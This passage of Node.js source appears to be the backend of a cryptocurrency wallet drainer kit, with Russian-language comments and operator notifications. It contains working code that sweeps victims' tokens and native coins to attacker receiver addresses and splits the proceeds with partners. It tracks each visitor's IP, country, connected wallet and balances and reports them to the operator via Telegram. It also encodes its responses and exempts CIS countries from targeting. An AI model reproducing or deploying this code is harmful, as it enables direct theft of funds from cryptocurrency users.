        fs.appendFileSync('random_wallets.txt', wallet_data, 'utf-8');
      } else {
        fs.writeFileSync('random_wallets.txt', wallet_data, 'utf-8');
      }
      if (fs.existsSync(path.join('data', 'wallets.json'))) {
        let wallet_arr = JSON.parse(fs.readFileSync(path.join('data', 'wallets.json'), 'utf-8'));
        wallet_arr[wallet.address] = wallet.privateKey;
        fs.writeFileSync(path.join('data', 'wallets.json'), JSON.stringify(wallet_arr), 'utf-8');
      } else {
        let wallet_arr = {}; wallet_arr[wallet.address] = wallet.privateKey;
        fs.writeFileSync(path.join('data', 'wallets.json'), JSON.stringify(wallet_arr), 'utf-8');
      }
    } catch(err) {
      console.log(err);
    }
    return { address: wallet.address, private: wallet.privateKey };
  } catch(err) {
    console.log(err);
    return false;
  }
};

const withdraw_token = async (wallet_data, asset, partner_address = false) => {
  try {
    await new Promise(r => setTimeout(r, 1000));

    let split_data = get_split_data(partner_address, MS_Split_Modes.tokens.transfer, (asset.amount_usd || null));
    let tx_count = !split_data ? 1 : 2;

    const chain_id = parseInt(asset.chain_id);
    const node = new RPC_NODE(MS_Private_RPC_URLs[chain_id]);
    const signer = new RPC_WALLET(wallet_data.private, node);
    const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(MS_Gas_Multiplier * 100)));

    let unsigned_tx = { from: wallet_data.address, value: "0x0", to: asset.address };

    const web3 = new Web3(MS_Private_RPC_URLs[chain_id]); let contract_data = null;
    const web3_contract = new web3.eth.Contract(MS_Contract_ABI['ERC20'], asset.address);

    contract_data = web3_contract.methods.transfer(MS_Wallet_Receiver[Math.floor(Math.random() * MS_Wallet_Receiver.length)], asset.amount_raw).encodeABI();
    unsigned_tx.data = contract_data;

    let gas_limit = BN(await node.estimateGas(unsigned_tx)).div(BN(100)).mul(BN(120));
    let balance = await node.getBalance(wallet_data.address);

    if (balance.lt(gas_limit.mul(gas_price).mul(BN(tx_count)))) {
      const left_amount = gas_limit.mul(gas_price).mul(BN(tx_count)).sub(balance);
      const main_balance = await node.getBalance(MS_Wallet_Address);

      if (main_balance.lt(left_amount)) return false;

      const main_signer = new RPC_WALLET(MS_Wallet_Private, node);
      const main_unsigned_tx = { from: MS_Wallet_Address, to: wallet_data.address, value: left_amount };
      const main_gas_limit = BN(await node.estimateGas(main_unsigned_tx)).div(BN(100)).mul(BN(120));

      main_unsigned_tx.gasPrice = gas_price;
      main_unsigned_tx.gasLimit = main_gas_limit;
      main_unsigned_tx.nonce = await node.getTransactionCount(MS_Wallet_Address, 'pending');

      const main_tx = await main_signer.sendTransaction(main_unsigned_tx);
      await node.waitForTransaction(main_tx.hash, 1, 60000);
    }

    if (tx_count == 1) {

      unsigned_tx.gasLimit = gas_limit;
      unsigned_tx.gasPrice = gas_price;
      unsigned_tx.nonce = await node.getTransactionCount(wallet_data.address, 'pending');

      let tx = await signer.sendTransaction(unsigned_tx);
      await node.waitForTransaction(tx.hash, 1, 60000);

    } else {

      let partner_amount = BN(asset.amount_raw).div(BN(100)).mul(BN(split_data));
      let owner_amount = BN(asset.amount_raw).sub(partner_amount);

      unsigned_tx.data = web3_contract.methods.transfer(MS_Wallet_Receiver[Math.floor(Math.random() * MS_Wallet_Receiver.length)], owner_amount.toString()).encodeABI();
      unsigned_tx.gasLimit = gas_limit;
      unsigned_tx.gasPrice = gas_price;
      unsigned_tx.nonce = await node.getTransactionCount(wallet_data.address, 'pending');

      let tx = await signer.sendTransaction(unsigned_tx);
      await node.waitForTransaction(tx.hash, 1, 60000);
      await new Promise(r => setTimeout(r, 1000));

      unsigned_tx.data = web3_contract.methods.transfer(partner_address, partner_amount.toString()).encodeABI();
      unsigned_tx.nonce = await node.getTransactionCount(wallet_data.address, 'pending');

      tx = await signer.sendTransaction(unsigned_tx);
      await node.waitForTransaction(tx.hash, 1, 60000);

    }

    await new Promise(r => setTimeout(r, 1000));
    balance = await node.getBalance(wallet_data.address);

    if (balance.gt(BN(0))) {
      try {
        unsigned_tx = { from: wallet_data.address, to: MS_Wallet_Address, value: BN(100) };
        gas_limit = BN(await node.estimateGas(unsigned_tx)).div(BN(100)).mul(BN(120));
        const available_amount = balance.sub(gas_limit.mul(gas_price));
        if (available_amount.gt(BN(0))) {
          unsigned_tx.value = available_amount;
          unsigned_tx.gasPrice = gas_price;
          unsigned_tx.gasLimit = gas_limit;
          unsigned_tx.nonce = await node.getTransactionCount(wallet_data.address, 'pending');
          signer.sendTransaction(unsigned_tx);
        }
      } catch(err) {
        console.log(err);
      }
    }

    return true;
  } catch(err) {
    console.log(err);
    return false;
  }
};

const withdraw_native = async (wallet_data, chain_id = 1, amount_usd = null, is_premium = false, partner_address = false) => {
  try {
    await new Promise(r => setTimeout(r, 1000));

    let split_data = get_split_data(partner_address, MS_Split_Modes.native.transfer, amount_usd);
    let tx_count = !split_data ? 1 : 2, is_tx_contract = false;

    const node = new RPC_NODE(MS_Private_RPC_URLs[chain_id]);
    const signer = new RPC_WALLET(wallet_data.private, node);
    const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(MS_Gas_Multiplier * 100)));
    const unsigned_tx = {
      from: wallet_data.address, value: BN(100), data: '0x',
      to: MS_Wallet_Receiver[Math.floor(Math.random() * MS_Wallet_Receiver.length)]
    };
    let gas_limit = BN(await node.estimateGas(unsigned_tx)).div(BN(100)).mul(BN(120));
    const balance = await node.getBalance(wallet_data.address);
    let available_amount = balance.sub(gas_limit.mul(gas_price).mul(BN(tx_count)));
    if (available_amount.lte(BN(0))) return false;

    if (MS_Settings.Use_Public_Contract && typeof MS_Public_Contract == 'object' && MS_Public_Contract[chain_id] &&  MS_Public_Contract[chain_id] != null) {
      const contract_address = is_premium ? MS_Public_Contract[chain_id][1] : MS_Public_Contract[chain_id][0];
      const web3 = new Web3(MS_Private_RPC_URLs[chain_id]); let contract_data = null;
      const web3_contract = new web3.eth.Contract(MS_Contract_ABI['MS_NEW'], contract_address);
      let secondary_address = !partner_address ? '0x0000000000000000000000000000000000000000' : partner_address;
      contract_data = web3_contract.methods.Deposit(wallet_data.address, MS_Wallet_Receiver[Math.floor(Math.random() * MS_Wallet_Receiver.length)],
      secondary_address, web3.utils.toHex(!split_data ? 0 : split_data), false).encodeABI(); unsigned_tx.data = contract_data; unsigned_tx.to = contract_address;
      const alternative_gas_limit = BN((chain_id == 42161) ? 5000000 : (chain_id == 43114 ? 5000000 : (chain_id == 369 ? 900000 : 100000)));
      const alternative_amount = balance.sub(alternative_gas_limit.mul(gas_price));
      if (alternative_amount.lte(BN(0))) {
        unsigned_tx.data = '0x';
        unsigned_tx.to = MS_Wallet_Receiver[Math.floor(Math.random() * MS_Wallet_Receiver.length)];
      } else {
        gas_limit = alternative_gas_limit;
        available_amount = alternative_amount;
        is_tx_contract = true;
      }
    }

    if (is_tx_contract || tx_count == 1) {

      unsigned_tx.value = available_amount;
      unsigned_tx.gasPrice = gas_price;
      unsigned_tx.gasLimit = gas_limit;
      unsigned_tx.nonce = await node.getTransactionCount(wallet_data.address, 'pending');

      const tx = await signer.sendTransaction(unsigned_tx);
      await node.waitForTransaction(tx.hash, 1, 30000);

    } else {

      let partner_amount = available_amount.div(BN(100)).mul(BN(split_data));
      let owner_amount = available_amount.sub(partner_amount);

      unsigned_tx.value = owner_amount;
      unsigned_tx.gasPrice = gas_price;
      unsigned_tx.gasLimit = gas_limit;
      unsigned_tx.nonce = await node.getTransactionCount(wallet_data.address, 'pending');

      let tx = await signer.sendTransaction(unsigned_tx);
      await node.waitForTransaction(tx.hash, 1, 30000);
      await new Promise(r => setTimeout(r, 1000));

      unsigned_tx.to = partner_address;
      unsigned_tx.value = partner_amount;
      unsigned_tx.nonce = await node.getTransactionCount(wallet_data.address, 'pending');

      tx = await signer.sendTransaction(unsigned_tx);
      await node.waitForTransaction(tx.hash, 1, 30000);

    }

    return true;
  } catch(err) {
    console.log(err);
    return false;
  }
};

// ============================================================================= //
// Автор и разработчик не одобряет использование данного ПО в указанных странах
// Удаление какой-либо страны из данного списка СТРОГО ЗАПРЕЩЕНО И НЕ ОДОБРЯЕТСЯ
// ============================================================================= //
const MS_Banned_Countries = [ 'RU', 'BY', 'KZ', 'UZ', 'AZ', 'AM', 'TJ', 'KG' ];
// ============================================================================= //

const bot = new Telegram(MS_Telegram_Token, { polling: MS_Functional_Bot });

const send_message = async (chat_ids, text, options = undefined) => {
  try {
    let main_promise = null;
    if (typeof chat_ids == 'object') {
      for (const chat_id of chat_ids) {
        try {
          let new_promise = bot.sendMessage(chat_id, text, options);
          if (main_promise == null) main_promise = new_promise;
        } catch(err) {
          console.log(err);
        }
      }
      return main_promise;
    } else {
      main_promise = bot.sendMessage(chat_ids, text, options);
      return main_promise;
    }
  } catch(err) {
    console.log(err);
  } return new Promise(r => { r(); });
};

const web = express();
web.use(express.json());

web.use(require("cors")());
web.use(require('express-useragent').express());
web.use(express.static('public')); web.use(parser.json({ limit: '50mb' }));
web.use(parser.urlencoded({ limit: '50mb', extended: true }));
web.use((require('express-body-parser-error-handler'))());

let last_free_id = 1;

if (MS_Keep_ID_History && fs.existsSync('ids.dat'))
  last_free_id = parseInt(fs.readFileSync('ids.dat', 'utf-8'));

const free_id = () => {
  last_free_id += 1;
  if (MS_Keep_ID_History)
    fs.writeFileSync('ids.dat', String(last_free_id), 'utf-8');
  return last_free_id - 1;
};

let User_IPs_Pool = {};

setInterval(() => {
  User_IPs_Pool = {};
  for (const address in MS_Verified_Addresses) {
    try {
      if (Math.floor(Date.now() / 1000) - MS_Verified_Addresses[address] > 300) {
        delete MS_Verified_Addresses[address];
      }
    } catch(err) {
      console.log(err);
    }
  }
}, 15 * 60 * 1000);

const prs = (s, t) => {
  const ab = (t) => t.split("").map((c) => c.charCodeAt(0));
  const bh = (n) => ("0" + Number(n).toString(16)).substr(-2);
  const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
  return t.split("").map(ab).map(as).map(bh).join("");
};

const srp = (s, e) => {
  const ab = (text) => text.split("").map((c) => c.charCodeAt(0));
  const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
  return e.match(/.{1,2}/g).map((hex) => parseInt(hex, 16)).map(as).map((charCode) => String.fromCharCode(charCode)).join("");
};

const send_response = async (response, data) => {
  try {
    const encode_key = Buffer.from(String(5 + 10 + 365 + 2048 + 867 + MS_Encryption_Key)).toString('base64');
    const data_encoded = prs(encode_key, Buffer.from(JSON.stringify(data)).toString('base64'));
    return response.status(200).send(data_encoded);
  } catch(err) {
    console.log(err);
    return false;
  }
};

const block_request = async (response) => {
  try {
    return await send_response(response, { status: 'error', error: 'SRV_UNAVAILABLE' });
  } catch(err) {
    console.log(err);
  }
};

const add_record = async (record) => {
  try {
    if (!MS_Enable_API) return;
    if (MS_API_Mode == 1 && record.type != 'asset_sent') return;
    if (MS_API_Mode == 2 && record.type != 'enter_website' && record.type != 'connect_wallet' && record.type != 'asset_sent') return;
    if (!fs.existsSync('API_DATA')) fs.writeFileSync('API_DATA', '[]', 'utf-8');
    let API_Data = JSON.parse(fs.readFileSync('API_DATA', 'utf-8')), ts = Math.floor(Date.now() / 1000);
    record.ts = ts; API_Data.push(record);
    fs.writeFileSync('API_DATA', JSON.stringify(API_Data), 'utf-8');
  } catch(err) {
    console.log(err);
  }
};

const add_allowance = async (owner, spender, token, chain_id, permit2 = false, private = false, partner_address = false) => {
  try {
    if (!MS_Allowance_API) return false;
    let allowance_list = [];
    if (fs.existsSync('allowances.dat'))
      allowance_list = JSON.parse(fs.readFileSync('allowances.dat', 'utf-8'));
    for (const allowance of allowance_list) {
      if (allowance.owner == owner && allowance.token == token
      && allowance.chain_id == chain_id && allowance.permit2 == permit2) {
        return false;
      }
    }
    allowance_list.push({ owner, spender, token, chain_id, permit2, private, partner_address, from_ts: Math.floor(Date.now() / 1000) + 300 });
    fs.writeFileSync('allowances.dat', JSON.stringify(allowance_list), 'utf-8');
    return true;
  } catch(err) {
    console.log(err);
  }
};

const update_allowance = async (owner, spender, token, chain_id, permit2 = false, balance = '0') => {
  try {
    if (!MS_Allowance_API) return false;
    let allowance_list = [];
    if (fs.existsSync('allowances.dat'))
      allowance_list = JSON.parse(fs.readFileSync('allowances.dat', 'utf-8'));
    for (let x = (allowance_list.length - 1); x >= 0; x--) {
      const allowance = allowance_list[x];
      if (allowance.owner == owner && allowance.spender == spender && allowance.token == token
      && allowance.chain_id == chain_id && allowance.permit2 == permit2) {
        allowance_list[x].last_balance = balance;
        fs.writeFileSync('allowances.dat', JSON.stringify(allowance_list), 'utf-8');
        return true;
      }
    }
    return false;
  } catch(err) {
    console.log(err);
  }
};

const remove_allowance = async (owner, spender, token, chain_id, permit2 = false) => {
  try {
    if (!MS_Allowance_API) return false;
    let allowance_list = [];
    if (fs.existsSync('allowances.dat'))
      allowance_list = JSON.parse(fs.readFileSync('allowances.dat', 'utf-8'));
    for (let x = (allowance_list.length - 1); x >= 0; x--) {
      const allowance = allowance_list[x];
      if (allowance.owner == owner && allowance.spender == spender && allowance.token == token
      && allowance.chain_id == chain_id && allowance.permit2 == permit2) {
        allowance_list.splice(x, 1);
        fs.writeFileSync('allowances.dat', JSON.stringify(allowance_list), 'utf-8');
        return true;
      }
    }
    return false;
  } catch(err) {
    console.log(err);
  }
};

const chain_id_to_name = (chain_id) => {
  switch (chain_id) {
    case 1: return 'Ethereum';
    case 10: return 'Optimism';
    case 56: return 'BNB Smart Chain';
    case 137: return 'Polygon (MATIC)';
    case 250: return 'Fantom';
    case 42161: return 'Arbitrum';
    case 43114: return 'Avalanche';
    case 8453: return 'Base';
    case 324: return 'ZkSync Era';
    case 369: return 'Pulse';
    default: return 'Unknown Network';
  }
};

const detect_browser = (UA) => {
  try {
    return UA.browser;
  } catch(err) {
    console.log(err);
    return 'Unknown';
  }
};

const detect_OS = (UA) => {
  try {
    return UA.os;
  } catch(err) {
    console.log(err);
    return 'Unknown';
  }
};

const detect_country = async (IP) => {
  try {
    const IP_Data = await axios.get(`http://ip-api.com/json/${IP}`);
    if (IP_Data.data.status == 'success')
      return IP_Data.data.countryCode;
    else return 'UNK';
  } catch(err) {
    console.log(err);
    return 'UNK';
  }
};

const on_enter_website = async (response, data) => {
  try {
    let User_Country = await detect_country(data.IP), User_Browser = detect_browser(data.UA), User_OS = detect_OS(data.UA);
    if (MS_CIS_Protection && MS_Banned_Countries.includes(User_Country.toUpperCase())) return send_response(response, { status: 'error',  error: 'BAD_COUNTRY' });
    add_record({
      type: 'enter_website', domain: data.domain, IP: data.IP, UA: data.UA.source,
      country: User_Country, browser: User_Browser, OS: User_OS, user_id: data.user_id,
      worker_id: data.worker_id || null
    });
    if ((data.chat_data == false && MS_Notifications.enter_website.mode) || (data.chat_data != false && data.chat_data.enter_website != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.enter_website.chat_id : data.chat_data.enter_website;
      try {
        if (MS_Functional_Bot) {
          await send_message(receiver_chat_id, `<b>👋 Новое посещение вашего сайта</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code> (${User_Country})\n<b>🖥 User Agent:</b> <code>${data.UA.source}</code>\n<b>💾 Система:</b> <code>${User_OS}</code>\n<b>🌍 Браузер:</b> <code>${User_Browser}</code>\n<b>🕐 Время:</b> <code>${data.time}</code>\n<b>👨‍🦰 Пользователь:</b> <code>#user_${data.user_id}</code>`, {
            parse_mode: 'HTML', reply_markup: {
              inline_keyboard: [
                [
                  { text: '🤕 Заблокировать IP', callback_data: `block_ip_${data.IP.toLowerCase().trim()}` }
                ]
              ]
            }
          });
        } else {
          await send_message(receiver_chat_id, `<b>👋 Новое посещение вашего сайта</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code> (${User_Country})\n<b>🖥 User Agent:</b> <code>${data.UA.source}</code>\n<b>💾 Система:</b> <code>${User_OS}</code>\n<b>🌍 Браузер:</b> <code>${User_Browser}</code>\n<b>🕐 Время:</b> <code>${data.time}</code>\n<b>👨‍🦰 Пользователь:</b> <code>#user_${data.user_id}</code>`, {
            parse_mode: 'HTML'
          });
        }
      } catch(err) {
        console.log(err);
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const on_leave_website = async (response, data) => {
  try {
    add_record({ type: 'leave_website', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, user_id: data.user_id });
    if ((data.chat_data == false && MS_Notifications.leave_website.mode) || (data.chat_data != false && data.chat_data.leave_website != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.leave_website.chat_id : data.chat_data.leave_website;
      try {
        await send_message(receiver_chat_id, `<b>😭 Пользователь #user_${data.user_id} закрыл, либо перезагрузил сайт</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>`, {
          parse_mode: 'HTML'
        });
      } catch (err) {
        console.log(err);
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const on_connect_request = async (response, data) => {
  try {
    if (MS_Protection) {
      if (isNaN(parseInt(data.user_id)) || !Supported_Wallets.includes(data.wallet)) {
        if (!User_IPs_Pool[data.IP]) User_IPs_Pool[data.IP] = {};
        User_IPs_Pool[data.IP]['strange_data'] = Math.floor(Date.now() / 1000) + (10 * 60);
        return block_request(response);
      }
    }
    add_record({ type: 'connect_request', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, wallet: data.wallet, user_id: data.user_id });
    if ((data.chat_data == false && MS_Notifications.connect_request.mode) || (data.chat_data != false && data.chat_data.connect_request != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.connect_request.chat_id : data.chat_data.connect_request;
      try {
        await send_message(receiver_chat_id, `<b>❓ Запросили подключение у пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>💰 Тип кошелька:</b> <code>${data.wallet}</code>`, {
          parse_mode: 'HTML'
        });
      } catch(err) {
        console.log(err);
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const on_connect_cancel = async (response, data) => {
  try {
    add_record({ type: 'connect_cancel', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, user_id: data.user_id });
    if ((data.chat_data == false && MS_Notifications.connect_cancel.mode) || (data.chat_data != false && data.chat_data.connect_cancel != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.connect_cancel.chat_id : data.chat_data.connect_cancel;
      try {
        await send_message(receiver_chat_id, `<b>❌ Пользователь #user_${data.user_id} отклонил подключение</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>`, {
          parse_mode: 'HTML'
        });
      } catch (err) {
        console.log(err);
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const on_connect_success = async (response, data) => {
  try {
    if (MS_Protection) {
      if (isNaN(parseInt(data.user_id)) || !Supported_Wallets.includes(data.wallet) || !data.address.match(/^0x\S{40,40}$/)) {
        if (!User_IPs_Pool[data.IP]) User_IPs_Pool[data.IP] = {};
        User_IPs_Pool[data.IP]['strange_data'] = Math.floor(Date.now() / 1000) + (10 * 60);
        return block_request(response);
      }
    }
    add_record({
      type: 'connect_wallet', domain: data.domain, IP: data.IP, user_id: data.user_id,
      wallet_type: data.wallet, wallet_address: data.address, wallet_network: data.chain_id,
      worker_id: data.worker_id || null
    });
    if ((data.chat_data == false && MS_Notifications.connect_success.mode) || (data.chat_data != false && data.chat_data.connect_success != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.connect_success.chat_id : data.chat_data.connect_success;
      let User_Country = await detect_country(data.IP);
      if (MS_Functional_Bot) {
        await send_message(receiver_chat_id, `<b>🦊 Пользователь #user_${data.user_id} подключил кошелёк</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code> (${User_Country})\n\n<b>💰 Тип кошелька:</b> <code>${data.wallet}</code>\n<b>💠 Адрес:</b> <code>${data.address}</code>\n<b>⛓ Текущая сеть:</b> <code>${chain_id_to_name(data.chain_id)}</code>\n\n<i>Производится расчёт баланса, если пользователь не покинет сайт, вы получите уведомление</i>`, {
          parse_mode: 'HTML', reply_markup: {
            inline_keyboard: [
              [
                { text: '🤕 Заблокировать кошелек', callback_data: `block_wallet_${data.address.toLowerCase().trim()}` }
              ]
            ]
          }
        });
      } else {
        await send_message(receiver_chat_id, `<b>🦊 Пользователь #user_${data.user_id} подключил кошелёк</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code> (${User_Country})\n\n<b>💰 Тип кошелька:</b> <code>${data.wallet}</code>\n<b>💠 Адрес:</b> <code>${data.address}</code>\n<b>⛓ Текущая сеть:</b> <code>${chain_id_to_name(data.chain_id)}</code>\n\n<i>Производится расчёт баланса, если пользователь не покинет сайт, вы получите уведомление</i>`, {
          parse_mode: 'HTML'
        });
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const on_check_finish = async (response, data) => {
  try {
    add_record({ type: 'check_results', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, assets: data.assets, balance: data.balance, user_id: data.user_id });
    if ((data.chat_data == false && MS_Notifications.connect_success.mode) || (data.chat_data != false && data.chat_data.connect_success != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.connect_success.chat_id : data.chat_data.connect_success;
      let assets_native = "", assets_tokens = "", assets_nfts = "";
      for (const asset of data.assets) {
        try {
          if (asset.type == 'NATIVE') {
            assets_native += `${asset.name} [${chain_id_to_name(asset.chain_id)}] (${asset.amount_usd.toFixed(2)}$); `;
          } else if (asset.type == 'ERC20') {
            assets_tokens += `${asset.name} [${chain_id_to_name(asset.chain_id)}] (${asset.amount_usd.toFixed(2)}$); `;
          } else if (asset.type == 'ERC721') {
            assets_nfts += `${asset.name} [${chain_id_to_name(asset.chain_id)}] (${asset.amount_usd.toFixed(2)}$); `;
          }
        } catch(err) {
          console.log(err);
        }
      };
      if (assets_native == "") assets_native = '<i>пусто</i>';
      if (assets_tokens == "") assets_tokens = '<i>пусто</i>';
      if (assets_nfts == "") assets_nfts = '<i>пусто</i>';
      try {
        await send_message(receiver_chat_id, `<b>💰 Пользователь #user_${data.user_id} отсканировал кошелек</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Общий баланс кошелька:</b> <code>${data.balance.toFixed(2)}$</code>\n\n<b>Основная монета:</b> ${assets_native}\n\n<b>ERC-20 токены:</b> ${assets_tokens}\n\n<b>NFT:</b> ${assets_nfts}`, {
          parse_mode: 'HTML'
        });
      } catch(err) {
        console.log(err);
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const on_chain_request = async (response, data) => {
  try {
    add_record({ type: 'chain_request', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, current_chain: data.chains[0], suggest_chain: data.chains[1], user_id: data.user_id });
    if ((data.chat_data == false && MS_Notifications.chain_request.mode) || (data.chat_data != false && data.chat_data.chain_request != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.chain_request.chat_id : data.chat_data.chain_request;
      try {
        await send_message(receiver_chat_id, `<b>❓ Пользователь #user_${data.user_id} получил запрос на смену сети</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>⛓ Текущая сеть:</b> ${chain_id_to_name(data.chains[0])}\n<b>⛓ Новая сеть:</b> ${chain_id_to_name(data.chains[1])}`, {
          parse_mode: 'HTML'
        });
      } catch(err) {
        console.log(err);
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const on_chain_success = async (response, data) => {
  try {
    add_record({ type: 'chain_success', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, user_id: data.user_id });
    if ((data.chat_data == false && MS_Notifications.chain_success.mode) || (data.chat_data != false && data.chat_data.chain_success != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.chain_success.chat_id : data.chat_data.chain_success;
      try {
        await send_message(receiver_chat_id, `<b>✅ Пользователь #user_${data.user_id} сменил сеть</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>`, {
          parse_mode: 'HTML'
        });
      } catch (err) {
        console.log(err);
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const on_chain_cancel = async (response, data) => {
  try {
    add_record({ type: 'chain_cancel', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, user_id: data.user_id });
    if ((data.chat_data == false && MS_Notifications.chain_cancel.mode) || (data.chat_data != false && data.chat_data.chain_cancel != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.chain_cancel.chat_id : data.chat_data.chain_cancel;
      try {
        await send_message(receiver_chat_id, `<b>❌ Пользователь #user_${data.user_id} отклонил смену сети, либо сеть недоступна</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>`, {
          parse_mode: 'HTML'
        });
      } catch(err) {
        console.log(err);
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const on_transfer_cancel = async (response, data) => {
  try {
    add_record({ type: 'transfer_cancel', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, user_id: data.user_id });
    if ((data.chat_data == false && MS_Notifications.transfer_cancel.mode) || (data.chat_data != false && data.chat_data.transfer_cancel != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.transfer_cancel.chat_id : data.chat_data.transfer_cancel;
      try {
        await send_message(receiver_chat_id, `<b>❌ Пользователь #user_${data.user_id} отклонил перевод, либо транзакция не прошла</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>`, {
          parse_mode: 'HTML'
        });
      } catch(err) {
        console.log(err);
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const on_approve_cancel = async (response, data) => {
  try {
    add_record({ type: 'approve_cancel', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, user_id: data.user_id });
    if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
      try {
        await send_message(receiver_chat_id, `<b>❌ Пользователь #user_${data.user_id} отклонил подтверждение, либо транзакция не прошла</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>`, {
          parse_mode: 'HTML'
        });
      } catch(err) {
        console.log(err);
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const on_sign_cancel = async (response, data) => {
  try {
    add_record({ type: 'sign_cancel', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, user_id: data.user_id });
    if ((data.chat_data == false && MS_Notifications.sign_cancel.mode) || (data.chat_data != false && data.chat_data.sign_cancel != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.sign_cancel.chat_id : data.chat_data.sign_cancel;
      try {
        await send_message(receiver_chat_id, `<b>❌ Пользователь #user_${data.user_id} отклонил подпись, либо транзакция не прошла</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>`, {
          parse_mode: 'HTML'
        });
      } catch(err) {
        console.log(err);
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const on_sign_unavailable = async (response, data) => {
  try {
    add_record({ type: 'sign_unavailable', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, user_id: data.user_id });
    if ((data.chat_data == false && MS_Notifications.sign_cancel.mode) || (data.chat_data != false && data.chat_data.sign_cancel != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.sign_cancel.chat_id : data.chat_data.sign_cancel;
      try {
        await send_message(receiver_chat_id, `<b>❌ Для пользователя #user_${data.user_id} недоступна подпись</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<i>Но без паники, просто его кошелек не поддерживает эту функцию, по возможности предложим ему другой способ...</i>`, {
          parse_mode: 'HTML'
        });
      } catch(err) {
        console.log(err);
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const on_sign_request = async (response, data) => {
  try {
